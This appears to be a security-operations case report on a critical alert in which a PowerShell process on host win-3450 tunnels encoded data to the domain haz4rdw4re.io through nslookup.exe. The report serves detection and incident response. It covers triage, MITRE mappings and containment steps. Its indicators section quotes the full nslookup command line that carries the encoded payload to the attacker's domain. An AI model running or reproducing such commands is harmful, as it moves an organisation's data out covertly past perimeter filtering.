# Alert 1031 Case Report - Active Data Exfiltration via DNS Tunneling (nslookup.exe Payload Chunk)

## 1. Summary
* **Classification:** True Positive
* **Severity:** Critical
* **Escalation Required:** Yes
* **Timestamp:** `09/07/2026 18:09:34.240`
* **Summary:** A Critical True Positive incident was identified on host `win-3450` (belonging to Michael Ascot) involving an ongoing DNS exfiltration stream. The compromised PowerShell process (PID: 3728) spawned `nslookup.exe` (PID: 5696) from the staged exfiltration directory, transmitting encoded data payload chunks (`dGF0aXN0aWMjMjAyNySwiR488verSyOuyS...`) to the C2 domain `haz4rdw4re.io`.

---

## 2. Affected Entities & Host Details
* **Source Host:** `win-3450`
* **User Account:** `michael.ascot` (Michael Ascot)
* **Target C2 Domain:** `dGF0aXN0aWMjMjAyNySwiR488verSyOuyS.haz4rdw4re.io`

---

## 3. Indicators & Process Artifacts
* **Parent Process:** `powershell.exe` (PID: 3728)
* **Child Process:** `nslookup.exe` (PID: 5696)
* **Working Directory:** `C:\Users\michael.ascot\downloads\exfiltration\`
* **Command Line:** `"C:\Windows\system32\nslookup.exe" dGF0aXN0aWMjMjAyNySwiR488verSyOuyS.haz4rdw4re.io`
* **Event Code:** Sysmon Event ID 1 (Process Create)
* **Threat Activity:** Covert Data Exfiltration & C2 Tunneling (MITRE ATT&CK T1071.004, T1048.003, T1132.001)
* **Malicious Indicators:** Execution of native binary `nslookup.exe` with base64/high-entropy subdomain payloads targeting an external domain (`haz4rdw4re.io`).

---

## 4. Triage & Analysis

**True Positive Justification:**
Sysmon Event ID 1 (Process Creation) logs confirm `powershell.exe` (PID: 3728) spawned `nslookup.exe` (PID: 5696) executing directly out of the local staging folder (`C:\Users\michael.ascot\downloads\exfiltration\`). The command line contains a distinct base64/encoded domain sublabel (`dGF0aXN0aWMjMjAyNySwiR488verSyOuyS`), confirming an active, automated DNS tunneling sequence designed to exfiltrate packaged corporate data under the guise of routine DNS queries.

**Escalation Justification:**
Critical escalation is required. This activity confirms continuous, automated data exfiltration via DNS queries following the initial file collection and staging phases (ALT-28). DNS tunneling intentionally circumvents standard perimeter web filtering controls by leveraging UDP port 53 traffic, indicating active sensitive data exfiltration from host `win-3450` that requires immediate network containment.

---

## 5. Resolution & Actions
1. **Immediate Host Isolation:** Isolate target host `win-3450` from the network immediately to sever all active DNS exfiltration connections.
2. **Process Termination:** Terminate parent process `powershell.exe` (PID: 3728) and child process `nslookup.exe` (PID: 5696).
3. **DNS Infrastructure Blocking:** Add `haz4rdw4re.io` and its associated subdomains (`*.haz4rdw4re.io`) to global DNS sinkholes and enterprise firewall blocklists.
4. **Credential Remediation:** Revoke active user sessions and force an immediate domain password reset for account `michael.ascot`.
5. **Exfiltration Timeline & Volume Analysis:** Query internal DNS resolver logs for all requests matching `*.haz4rdw4re.io` to determine the complete timeline, payload structure, and total volume of exfiltrated data.

## 6. Screenshots
<img width="2559" height="1386" alt="ALT-1031-Log" src="https://github.com/user-attachments/assets/3477ef44-f07d-4e75-a812-f24bbdb5ece5" />
<img width="2560" height="1392" alt="ALT-1031" src="https://github.com/user-attachments/assets/9c923530-7de1-4306-b9e3-24e55cf98ec4" />

